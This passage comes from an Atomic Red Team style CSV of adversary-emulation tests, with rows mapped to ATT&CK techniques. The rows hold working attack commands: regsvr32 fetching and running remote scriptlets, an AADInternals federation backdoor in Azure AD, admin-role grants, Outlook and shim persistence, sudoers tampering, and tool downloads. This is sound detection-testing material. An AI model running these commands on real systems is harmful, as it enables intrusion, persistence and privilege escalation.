Invoke-WebRequest ""https://github.com/netero1010/GhostTask/releases/download/1.0/GhostTask.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe""

","input_arguments.task_name.description: Name of the newly-added task

input_arguments.task_name.type: string

input_arguments.task_name.default: lilghostie

input_arguments.task_command.description: Command you want the task to execute

input_arguments.task_command.type: string

input_arguments.task_command.default: notepad.exe

input_arguments.target.description: System where the task should run

input_arguments.target.type: string

input_arguments.target.default: localhost

input_arguments.user_name.description: Username to authenticate with, such as ATOMICDOMAIN\AtomicAdmin

input_arguments.user_name.type: string

input_arguments.user_name.default: $env:USERDOMAIN + '\' + $env:USERNAME

"
T1218.010,Signed Binary Proxy Execution: Regsvr32,Regsvr32 local COM scriptlet execution,449aa403-6aba-47ce-8a37-247d21ef0306,"Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.
",windows,,,"#{regsvr32path}\#{regsvr32name} /s /u /i:""#{filename}"" scrobj.dll
",command_prompt,,,,powershell,"dependencies.0.description: Regsvr32.sct must exist on disk at specified location (#{filename})

dependencies.0.prereq_command: if (Test-Path ""#{filename}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{filename}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct"" -OutFile ""#{filename}""

","input_arguments.filename.description: Name of the local file, include path.

input_arguments.filename.type: path

input_arguments.filename.default: PathToAtomicsFolder\T1218.010\src\RegSvr32.sct

input_arguments.regsvr32path.description: Default location of Regsvr32.exe

input_arguments.regsvr32path.type: path

input_arguments.regsvr32path.default: C:\Windows\system32

input_arguments.regsvr32name.description: Default name of Regsvr32.exe

input_arguments.regsvr32name.type: string

input_arguments.regsvr32name.default: regsvr32.exe

"
T1218.010,Signed Binary Proxy Execution: Regsvr32,Regsvr32 remote COM scriptlet execution,c9d0c4ef-8a96-4794-a75b-3d3a5e6f2a36,"Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable
windows defender real-time protection to fix it. Upon execution, calc.exe will be launched.
",windows,,,"#{regsvr32path}\#{regsvr32name} /s /u /i:#{url} scrobj.dll
",command_prompt,,,,,,"input_arguments.url.description: URL to hosted sct file

input_arguments.url.type: url

input_arguments.url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct

input_arguments.regsvr32path.description: Default location of Regsvr32.exe

input_arguments.regsvr32path.type: path

input_arguments.regsvr32path.default: C:\Windows\system32

input_arguments.regsvr32name.description: Default name of Regsvr32.exe

input_arguments.regsvr32name.type: string

input_arguments.regsvr32name.default: regsvr32.exe

"
T1218.010,Signed Binary Proxy Execution: Regsvr32,Regsvr32 local DLL execution,08ffca73-9a3d-471a-aeb0-68b4aa3ab37b,"Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.
",windows,,,"IF ""%PROCESSOR_ARCHITECTURE%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\#{regsvr32name} /s #{dll_name} )
",command_prompt,,,,powershell,"dependencies.0.description: AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})

dependencies.0.prereq_command: if (Test-Path ""#{dll_name}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{dll_name}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll"" -OutFile ""#{dll_name}""

","input_arguments.dll_name.description: Name of DLL to Execute, DLL Should export DllRegisterServer

input_arguments.dll_name.type: path

input_arguments.dll_name.default: PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll

input_arguments.regsvr32path.description: Default location of Regsvr32.exe

input_arguments.regsvr32path.type: path

input_arguments.regsvr32path.default: C:\Windows\system32

input_arguments.regsvr32name.description: Default name of Regsvr32.exe

input_arguments.regsvr32name.type: string

input_arguments.regsvr32name.default: regsvr32.exe

"
T1218.010,Signed Binary Proxy Execution: Regsvr32,Regsvr32 Registering Non DLL,1ae5ea1f-0a4e-4e54-b2f5-4ac328a7f421,"Replicating observed Gozi maldoc behavior registering a dll with an altered extension
",windows,,,"#{regsvr32path}\#{regsvr32name} /s #{dll_file}
",command_prompt,False,,"#{regsvr32path}\#{regsvr32name} /U /s #{dll_file}
",command_prompt,"dependencies.0.description: Test requires a renamed dll file

dependencies.0.prereq_command: if exist #{dll_file} ( exit 0 ) else ( exit 1 )

dependencies.0.get_prereq_command: copy ""C:\Windows\System32\shell32.dll"" ""#{dll_file}""

","input_arguments.dll_file.description: Path to renamed dll file to be registered

input_arguments.dll_file.type: path

input_arguments.dll_file.default: %temp%\shell32.jpg

input_arguments.regsvr32path.description: Default location of Regsvr32.exe

input_arguments.regsvr32path.type: path

input_arguments.regsvr32path.default: C:\Windows\system32

input_arguments.regsvr32name.description: Default name of Regsvr32.exe

input_arguments.regsvr32name.type: string

input_arguments.regsvr32name.default: regsvr32.exe

"
T1218.010,Signed Binary Proxy Execution: Regsvr32,Regsvr32 Silent DLL Install Call DllRegisterServer,9d71c492-ea2e-4c08-af16-c6994cdf029f,"Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.",windows,,,"#{regsvr32path}\#{regsvr32name} /s /i ""#{dll_name}""
",command_prompt,,,,powershell,"dependencies.0.description: AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})
dependencies.0.prereq_command: if (Test-Path ""#{dll_name}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{dll_name}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll"" -OutFile ""#{dll_name}""
","input_arguments.dll_name.description: Name of DLL to Install

input_arguments.dll_name.type: string

input_arguments.dll_name.default: PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll

input_arguments.regsvr32path.description: Default location of Regsvr32.exe

input_arguments.regsvr32path.type: string

input_arguments.regsvr32path.default: C:\Windows\system32

input_arguments.regsvr32name.description: Default name of Regsvr32.exe

input_arguments.regsvr32name.type: string

input_arguments.regsvr32name.default: regsvr32.exe

"
T1484.002,Domain Trust Modification,Add Federation to Azure AD,8906c5d0-3ee5-4f63-897a-f6cafd3fdbb7,"Add a new federated domain to Azure AD using PowerShell.
The malicious domain to be federated must be configured beforehand (outside of the scope of this test):
    1. Open Azure Portal
    2. Add a new ""custom domain name""
    3. Verify the domain by following instructions (i.e. create the requested DNS record)
",azure-ad,,,"Import-Module AzureAD
Import-Module AADInternals

$PWord = ConvertTo-SecureString -String ""#{azure_password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{azure_username}"", $Pword

try {
  Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null
}
catch {
  Write-Host ""Error: AzureAD could not connect""
  exit 1
}

try {
  $domain = Get-AzureADDomain -Name ""#{domain_name}""
}
catch {
  Write-Host ""Error: domain """"#{domain_name}"""" not found""
  exit 1
}
if (-Not $domain.IsVerified) {
  Write-Host ""Error: domain """"#{domain_name}"""" not verified""
  exit 1
}

if ($domain.AuthenticationType -eq ""Federated"") {
  Write-Host ""Error: domain """"#{domain_name}"""" already federated. Try with a different domain or re-create it before.""
  exit 1
}

$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential
if (-Not $at) {
  Write-Host ""Error: AADInternals could not connect""
  exit 1
}

$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName ""#{domain_name}""
if ($new) {
  Write-Host ""Federation successfully added to Azure AD""
  Write-Host $new
}
else {
  Write-Host ""The federation setup failed""
}

Write-Host ""End of federation configuration.""
",powershell,,,"try {
  Import-Module AzureAD -ErrorAction Ignore

  $PWord = ConvertTo-SecureString -String ""#{azure_password}"" -AsPlainText -Force
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{azure_username}"", $Pword
  Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null

  Remove-AzureADDomain -Name ""#{domain_name}"" -ErrorAction Ignore
} catch {}
",powershell,"dependencies.0.description: AzureAD and AADInternals Powershell modules must be installed.

dependencies.0.prereq_command: if ((Get-Module -ListAvailable -Name AzureAD) -And (Get-Module -ListAvailable -Name AADInternals)) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Install-Module -Name AzureAD -Force
Install-Module -Name AADInternals -Force

","input_arguments.azure_username.description: Username of a privileged Azure AD account such as External Identity Provider Administrator or Global Administrator roles

input_arguments.azure_username.type: string

input_arguments.azure_username.default: bruce.wayne@contosocloud.com

input_arguments.azure_password.description: Password of azure_username

input_arguments.azure_password.type: string

input_arguments.azure_password.default: iamthebatman

input_arguments.domain_name.description: Malicious federated domain name

input_arguments.domain_name.type: string

input_arguments.domain_name.default: contoso.com

"
T1610,Deploy a container,Deploy Docker container,59aa6f26-7620-417e-9318-589e0fb7a372,"Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime. They can do this using docker create and docker start commands. Kinsing & Doki was exploited using this technique. 
",containers,,,"docker build -t t1610 $PathtoAtomicsFolder/T1610/src/
docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh
",bash,,,"docker stop t1610_container
docker rmi -f t1610:latest 
",sh,"dependencies.0.description: Verify docker is installed.
dependencies.0.prereq_command: which docker

dependencies.0.get_prereq_command: if [ """" == ""`which docker`"" ]; then echo ""Docker Not Found""; if [ -n ""`which apt-get`"" ]; then sudo apt-get -y install docker ; elif [ -n ""`which yum`"" ]; then sudo yum -y install docker ; fi ; else echo ""Docker installed""; fi

dependencies.1.description: Verify docker service is running.
dependencies.1.prereq_command: sudo systemctl status docker  --no-pager

dependencies.1.get_prereq_command: sudo systemctl start docker

",
T1137.004,Office Application Startup: Outlook Home Page,Install Outlook Home Page Persistence,7a91ad51-e6d2-4d43-9471-f26362f5738e,"This test simulates persistence being added to a host via the Outlook Home Page functionality. This causes Outlook to retrieve URL containing a malicious payload every time the targeted folder is viewed.

Triggering the payload requires manually opening Outlook and viewing the targetted folder (e.g. Inbox).
",windows,,,"reg.exe add HKCU\Software\Microsoft\Office\#{outlook_version}\Outlook\WebView\#{outlook_folder} /v URL /t REG_SZ /d #{url} /f
",command_prompt,False,,"reg.exe delete HKCU\Software\Microsoft\Office\#{outlook_version}\Outlook\WebView\#{outlook_folder} /v URL /f >nul 2>&1
",,,"input_arguments.url.description: URL to Outlook Home Page containing the payload to execute (can be local file:// or remote https://)

input_arguments.url.type: string

input_arguments.url.default: file://PathToAtomicsFolder\T1137.004\src\T1137.004.html

input_arguments.outlook_version.description: Version of Outlook that is installed

input_arguments.outlook_version.type: float

input_arguments.outlook_version.default: 16.0

input_arguments.outlook_folder.description: Name of the Outlook folder to modify the homepage setting for

input_arguments.outlook_folder.type: string

input_arguments.outlook_folder.default: Inbox

"
T1059.003,Command and Scripting Interpreter: Windows Command Shell,Create and Execute Batch Script,9e8894c0-50bd-4525-a96c-d4ac78ece388,"Creates and executes a simple batch script. Upon execution, CMD will briefly launch to run the batch script then close again.
",windows,,,"Start-Process ""#{script_path}""
",powershell,,,"Remove-Item ""#{script_path}"" -Force -ErrorAction Ignore
",powershell,"dependencies.0.description: Batch file must exist on disk at specified location (#{script_path})

dependencies.0.prereq_command: if (Test-Path ""#{script_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item ""#{script_path}"" -Force | Out-Null
Set-Content -Path ""#{script_path}"" -Value ""#{command_to_execute}""

","input_arguments.command_to_execute.description: Command to execute within script.

input_arguments.command_to_execute.type: string

input_arguments.command_to_execute.default: dir

input_arguments.script_path.description: Script path.

input_arguments.script_path.type: path

input_arguments.script_path.default: PathToAtomicsFolder\..\ExternalPayloads\T1059.003_script.bat

"
T1059.003,Command and Scripting Interpreter: Windows Command Shell,Writes text to a file and displays it.,127b4afe-2346-4192-815c-69042bec570e,"Writes text to a file and display the results. This test is intended to emulate the dropping of a malicious file to disk.
",windows,,,"echo ""#{message}"" > ""#{file_contents_path}"" & type ""#{file_contents_path}""
",command_prompt,,,"del ""#{file_contents_path}"" >nul 2>&1
",,,"input_arguments.file_contents_path.description: Path to the file that the command prompt will drop.

input_arguments.file_contents_path.type: path

input_arguments.file_contents_path.default: %TEMP%\test.bin

input_arguments.message.description: Message that will be written to disk and then displayed.

input_arguments.message.type: string

input_arguments.message.default: Hello from the Windows Command Prompt!

"
T1059.003,Command and Scripting Interpreter: Windows Command Shell,Suspicious Execution via Windows Command Shell,d0eb3597-a1b3-4d65-b33b-2cda8d397f20,"Command line executed via suspicious invocation. Example is from the 2021 Threat Detection Report by Red Canary.
",windows,,,"%LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file} & type #{output_file}
",command_prompt,,,,,,"input_arguments.output_file.description: File to output to

input_arguments.output_file.type: string

input_arguments.output_file.default: hello.txt

input_arguments.input_message.description: Message to write to file

input_arguments.input_message.type: string

input_arguments.input_message.default: Hello, from CMD!

"
T1059.003,Command and Scripting Interpreter: Windows Command Shell,Simulate BlackByte Ransomware Print Bombing,6b2903ac-8f36-450d-9ad5-b220e8a2dcb9,"This test attempts to open a file a specified number of times in Wordpad, then prints the contents. 
It is designed to mimic BlackByte ransomware's print bombing technique, where tree.dll, which contains the ransom note, is opened in Wordpad 75 times and then printed. 
See https://redcanary.com/blog/blackbyte-ransomware/. 
",windows,,,"cmd /c ""for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}"" | out-null
",powershell,,,"stop-process -name wordpad -force -erroraction silentlycontinue
",powershell,"dependencies.0.description: File to print must exist on disk at specified location (#{file_to_print})

dependencies.0.prereq_command: if (test-path ""#{file_to_print}""){exit 0} else {exit 1}

dependencies.0.get_prereq_command: new-item ""#{file_to_print}"" -value ""This file has been created by T1059.003 Test 4"" -Force | Out-Null

","input_arguments.file_to_print.description: File to be opened/printed by Wordpad.

input_arguments.file_to_print.type: string

input_arguments.file_to_print.default: PathToAtomicsFolder\..\ExternalPayloads\T1059_003note.txt

input_arguments.max_to_print.description: The maximum number of Wordpad windows the test will open/print.

input_arguments.max_to_print.type: integer

input_arguments.max_to_print.default: 75

"
T1059.003,Command and Scripting Interpreter: Windows Command Shell,Command Prompt read contents from CMD file and execute,df81db1b-066c-4802-9bc8-b6d030c3ba8e,"Simulate Raspberry Robin using the ""standard-in"" command prompt feature cmd `/R <` to read and execute a file via cmd.exe
See https://redcanary.com/blog/raspberry-robin/. 
",windows,,,"cmd /r cmd<""#{input_file}""
",command_prompt,False,,,powershell,"dependencies.0.description: CMD file must exist on disk at specified location (#{input_file})

dependencies.0.prereq_command: if (Test-Path ""#{input_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{input_file}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1059.003/src/t1059.003_cmd.cmd"" -OutFile ""#{input_file}""

","input_arguments.input_file.description: CMD file that is read by Command Prompt and execute, which launches calc.exe

input_arguments.input_file.type: path

input_arguments.input_file.default: PathToAtomicsFolder\T1059.003\src\t1059.003_cmd.cmd

"
T1059.003,Command and Scripting Interpreter: Windows Command Shell,Command prompt writing script to file then executes it,00682c9f-7df4-4df8-950b-6dcaaa3ad9af,"    Simulate DarkGate malware's second stage by writing a VBscript to disk directly from the command prompt then executing it.
    The script will execute 'whoami' then exit.",windows,,," c:\windows\system32\cmd.exe /c cd /d #{script_path} & echo Set objShell = CreateObject(""WScript.Shell""):Set objExec = objShell.Exec(""whoami""):Set objExec = Nothing:Set objShell = Nothing > #{script_name}.vbs & #{script_name}.vbs",command_prompt,True,,"del ""#{script_name}.vbs"" >nul 2>&1",,,"input_arguments.script_path.description: Path in which the script will be written.

input_arguments.script_path.type: path

input_arguments.script_path.default: %TEMP%\

input_arguments.script_name.description: Script name (without the extension)

input_arguments.script_name.type: string

input_arguments.script_name.default: AtomicTest

"
T1069.001,Permission Groups Discovery: Local Groups,Permission Groups Discovery (Local),952931a4-af0b-4335-bbbe-73c8c5b327ae,"Permission Groups Discovery
",linux,macos,,"if [ -x ""$(command -v dscacheutil)"" ]; then dscacheutil -q group; else echo ""dscacheutil is missing from the machine. skipping...""; fi;
if [ -x ""$(command -v dscl)"" ]; then dscl . -list /Groups; else echo ""dscl is missing from the machine. skipping...""; fi;
if [ -x ""$(command -v groups)"" ]; then groups; else echo ""groups is missing from the machine. skipping...""; fi;
if [ -x ""$(command -v id)"" ]; then id; else echo ""id is missing from the machine. skipping...""; fi;
if [ -x ""$(command -v getent)"" ]; then getent group; else echo ""getent is missing from the machine. skipping...""; fi;
cat /etc/group
",sh,,,,,,
T1069.001,Permission Groups Discovery: Local Groups,Basic Permission Groups Discovery Windows (Local),1f454dd6-e134-44df-bebb-67de70fb6cd8,"Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
information will be displayed.
",windows,,,"net localgroup
net localgroup ""Administrators""
",command_prompt,,,,,,
T1069.001,Permission Groups Discovery: Local Groups,Permission Groups Discovery PowerShell (Local),a580462d-2c19-4bc7-8b9a-57a41b7d3ba4,"Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
information will be displayed.
",windows,,,"get-localgroup
Get-LocalGroupMember -Name ""Administrators""
",powershell,,,,,,
T1069.001,Permission Groups Discovery: Local Groups,SharpHound3 - LocalAdmin,e03ada14-0980-4107-aff1-7783b2b59bb1,"This module runs the Windows executable of SharpHound in order to remotely list members of the local Administrators group (SAMR)
",windows,,,"New-Item -Path ""#{output_path}"" -ItemType Directory > $null
& ""#{sharphound_path}"" -d ""#{domain}"" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory ""#{output_path}""
",powershell,False,,"Remove-Item -Recurse #{output_path} -ErrorAction Ignore
",powershell,"dependencies.0.description: SharpHound binary must exist on disk and at specified location (#{sharphound_path}).
And the computer must be domain joined (implicit authentication).

dependencies.0.prereq_command: if (Test-Path ""#{sharphound_path}"") { exit 0 } else { exit 1 }

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/BloodHoundAD/BloodHound/blob/e062fe73d73c015dccb37fae5089342d009b84b8/Collectors/SharpHound.exe?raw=true"" -OutFile ""#{sharphound_path}""

","input_arguments.domain.description: FQDN of the targeted domain

input_arguments.domain.type: string

input_arguments.domain.default: $env:UserDnsDomain

input_arguments.sharphound_path.description: SharpHound Windows executable

input_arguments.sharphound_path.type: path

input_arguments.sharphound_path.default: PathToAtomicsFolder\..\ExternalPayloads\SharpHound.exe

input_arguments.output_path.description: Output for SharpHound

input_arguments.output_path.type: path

input_arguments.output_path.default: $env:TEMP\SharpHound\

"
T1069.001,Permission Groups Discovery: Local Groups,Wmic Group Discovery,7413be50-be8e-430f-ad4d-07bf197884b2,"Utilizing wmic.exe to enumerate groups on the local system. Upon execution, information will be displayed of local groups on system.
",windows,,,"wmic group get name
",command_prompt,,,,,,
T1069.001,Permission Groups Discovery: Local Groups,WMIObject Group Discovery,69119e58-96db-4110-ad27-954e48f3bb13,"Utilizing PowerShell cmdlet - get-wmiobject, to enumerate local groups on the endpoint. Upon execution, Upon execution, information will be displayed of local groups on system.
",windows,,,"Get-WMIObject Win32_Group
",powershell,,,,,,
T1069.001,Permission Groups Discovery: Local Groups,Permission Groups Discovery for Containers- Local Groups,007d7aa4-8c4d-4f55-ba6a-7c965d51219c,"Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.",containers,,,"docker build -t t1069 $PathtoAtomicsFolder/T1069.001/src/
docker run --name t1069_container  -d -t t1069
docker exec t1069_container ./test.sh",sh,,,"docker stop t1069_container
docker rmi -f t1069",sh,"dependencies.0.description: Verify docker is installed.
dependencies.0.prereq_command: which docker

dependencies.0.get_prereq_command: if [ """" == ""`which docker`"" ]; then echo ""Docker Not Found""; if [ -n ""`which apt-get`"" ]; then sudo apt-get -y install docker ; elif [ -n ""`which yum`"" ]; then sudo yum -y install docker ; fi ; else echo ""Docker installed""; fi

dependencies.1.description: Verify docker service is running.
dependencies.1.prereq_command: sudo systemctl status docker  --no-pager

dependencies.1.get_prereq_command: sudo systemctl start docker

",
T1546.011,Event Triggered Execution: Application Shimming,Application Shim Installation,9ab27e22-ee62-4211-962b-d36d9a0e6a18,"Install a shim database. This technique is used for privilege escalation and bypassing user access control.
Upon execution, ""Installation of AtomicShim complete."" will be displayed. To verify the shim behavior, run 
the AtomicTest.exe from the <PathToAtomicsFolder>\\T1546.011\\bin directory. You should see a message box appear
with ""Atomic Shim DLL Test!"" as defined in the AtomicTest.dll. To better understand what is happening, review
the source code files is the <PathToAtomicsFolder>\\T1546.011\\src directory.
",windows,,,"sdbinst.exe ""#{file_path}""
",command_prompt,True,,"sdbinst.exe -u ""#{file_path}"" >nul 2>&1
",powershell,"dependencies.0.description: Shim database file must exist on disk at specified location (#{file_path})

dependencies.0.prereq_command: if (Test-Path ""#{file_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory (split-path ""#{file_path}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicShimx86.sdb"" -OutFile ""#{file_path}""

dependencies.1.description: AtomicTest.dll must exist at c:\Tools\AtomicTest.dll

dependencies.1.prereq_command: if (Test-Path c:\Tools\AtomicTest.dll) {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory (split-path c:\Tools\AtomicTest.dll) -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll"" -OutFile c:\Tools\AtomicTest.dll

","input_arguments.file_path.description: Path to the shim database file

input_arguments.file_path.type: string

input_arguments.file_path.default: PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb

"
T1546.011,Event Triggered Execution: Application Shimming,New shim database files created in the default shim database directory,aefd6866-d753-431f-a7a4-215ca7e3f13d,"Upon execution, check the ""C:\Windows\apppatch\Custom\"" folder for the new shim database

https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
",windows,,,"Copy-Item ""$PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb"" C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb
Copy-Item ""$PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb"" C:\Windows\apppatch\Custom\Custom64\T1546.011CompatDatabase.sdb
",powershell,True,,"Remove-Item C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb -ErrorAction Ignore
Remove-Item C:\Windows\apppatch\Custom\Custom64\T1546.011CompatDatabase.sdb -ErrorAction Ignore
",,,
T1546.011,Event Triggered Execution: Application Shimming,Registry key creation and/or modification events for SDB,9b6a06f9-ab5e-4e8d-8289-1df4289db02f,"Create registry keys in locations where fin7 typically places SDB patches. Upon execution, output will be displayed describing
the registry keys that were created. These keys can also be viewed using the Registry Editor.

https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
",windows,,,"New-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom"" -Name ""AtomicRedTeamT1546.011"" -Value ""AtomicRedTeamT1546.011""
New-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"" -Name ""AtomicRedTeamT1546.011"" -Value ""AtomicRedTeamT1546.011""
",powershell,True,,"Remove-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom"" -Name ""AtomicRedTeamT1546.011"" -ErrorAction Ignore
Remove-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"" -Name ""AtomicRedTeamT1546.011"" -ErrorAction Ignore
",,,
T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching,Sudo usage,150c3a08-ee6e-48a6-aeaf-3659d24ceb4e,"Common Sudo enumeration methods.
",macos,linux,,"sudo -l      
sudo cat /etc/sudoers
sudo vim /etc/sudoers
",sh,True,,,,,
T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching,Sudo usage (freebsd),2bf9a018-4664-438a-b435-cc6f8c6f71b1,"Common Sudo enumeration methods.
",linux,,,"sudo -l      
sudo cat /usr/local/etc/sudoers
sudo ee /usr/local/etc/sudoers
",sh,True,,,sh,"dependencies.0.description: Check if sudo is installed.

dependencies.0.prereq_command: if [ ! -x ""$(command -v sudo)"" ]; then exit 1; else exit 0; fi;

dependencies.0.get_prereq_command: (which pkg && pkg install -y sudo)

",
T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching,Unlimited sudo cache timeout,a7b17659-dd5e-46f7-b7d1-e6792c91d0bc,"Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
",macos,linux,,"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers
",sh,True,,,,,
T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching,Unlimited sudo cache timeout (freebsd),a83ad6e8-6f24-4d7f-8f44-75f8ab742991,"Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
",linux,,,"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers
sudo visudo -c -f /usr/local/etc/sudoers
",sh,True,,,sh,"dependencies.0.description: Check if sudo is installed.

dependencies.0.prereq_command: if [ ! -x ""$(command -v sudo)"" ]; then exit 1; else exit 0; fi;

dependencies.0.get_prereq_command: (which pkg && pkg install -y sudo)

",
T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching,Disable tty_tickets for sudo caching,91a60b03-fb75-4d24-a42e-2eb8956e8de1,"Sets sudo caching tty_tickets value to disabled. This is dangerous to modify without using 'visudo', do not do this on a production system.
",macos,linux,,"sudo sh -c ""echo Defaults ""'!'""tty_tickets >> /etc/sudoers""
sudo visudo -c -f /etc/sudoers
",sh,True,,,,,
T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching,Disable tty_tickets for sudo caching (freebsd),4df6a0fe-2bdd-4be8-8618-a6a19654a57a,"Sets sudo caching tty_tickets value to disabled. This is dangerous to modify without using 'visudo', do not do this on a production system.
",linux,,,"sudo sh -c ""echo Defaults ""'!'""tty_tickets >> /usr/local/etc/sudoers""
sudo visudo -c -f /usr/local/etc/sudoers
",sh,True,,,sh,"dependencies.0.description: Check if sudo is installed.

dependencies.0.prereq_command: if [ ! -x ""$(command -v sudo)"" ]; then exit 1; else exit 0; fi;

dependencies.0.get_prereq_command: (which pkg && pkg install -y sudo)

",
T1098.003,Account Manipulation: Additional Cloud Roles,Azure AD - Add Company Administrator Role to a user,4d77f913-56f5-4a14-b4b1-bf7bb24298ad,"Add an existing Azure user account the Company Administrator Role.
",azure-ad,,,"Import-Module MSOnline
$Password = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Password
Connect-MsolService -Credential $Credential
Add-MsolRoleMember -RoleName ""Company Administrator"" -RoleMemberEmailAddress ""#{target_user}""
",powershell,False,,"Remove-MsolRoleMember -RoleName ""Company Administrator"" -RoleMemberType User -RoleMemberEmailAddress ""#{target_user}""
",powershell,"dependencies.0.description: MSOnline module must be installed.

dependencies.0.prereq_command: try {if (Get-InstalledModule -Name MSOnline -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}

dependencies.0.get_prereq_command: Install-Module -Name MSOnline -Force

","input_arguments.username.description: Azure AD username

input_arguments.username.type: string

input_arguments.username.default: jonh@contoso.com

input_arguments.password.description: Azure AD password

input_arguments.password.type: string

input_arguments.password.default: p4sswd

input_arguments.target_user.description: Name of the user who will be assigned the Company Admin role

input_arguments.target_user.type: string

input_arguments.target_user.default: default

"
T1098.003,Account Manipulation: Additional Cloud Roles,Simulate - Post BEC persistence via user password reset followed by user added to company administrator role,14f3af20-61f1-45b8-ad31-4637815f3f44,"This test looks at simulating the an adversary described in the following blog post. It involves resetting the password of a normal user and adding to the company administrator role within M365.
 Reference: https://www.huntress.com/blog/business-email-compromise-via-azure-administrative-privileges
",azure-ad,,,"Import-Module MSOnline
Import-Module AzureAD
$password = ConvertTo-SecureString -String ""#{auth_password}"" -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{auth_username}"", $password
$targetsecurepw = ConvertTo-SecureString -String ""#{target_password}"" -AsPlainText -Force
Connect-MsolService -Credential $credential -ErrorAction:SilentlyContinue
Connect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue

#Saving the ObjectId of the target_user into a variable
$target_objid = Get-AzureADUser -filter ""userPrincipalName eq '#{target_user}'"" | Select-Object -ExpandProperty ObjectId

